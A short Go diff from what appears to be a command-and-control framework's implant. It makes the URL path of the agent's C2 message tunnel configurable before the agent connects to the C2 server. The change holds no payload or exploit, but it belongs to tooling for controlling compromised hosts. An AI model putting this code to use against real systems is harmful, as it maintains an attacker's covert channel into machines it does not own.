@@ -198,7 +198,15 @@ connect:
 
 	// connect to MsgAPI, the JSON based h2 tunnel
 	token := uuid.NewString() // dummy token
-	msgURL := netutil.JoinURL(def.CCAddress, transport.MsgAPI, token)
+	prefix := common.RuntimeConfig.C2Prefix
+	if prefix == "" {
+		prefix = transport.WebRoot
+	}
+	msgPath := common.RuntimeConfig.MsgPath
+	if msgPath == "" {
+		msgPath = "msg"
+	}
+	msgURL := netutil.JoinURL(def.CCAddress, prefix, msgPath, token)
 	conn, ctx, cancel, err := c2transport.EstablishC2Connection(msgURL)
 	def.CCMsgConn = conn
 	if err != nil {
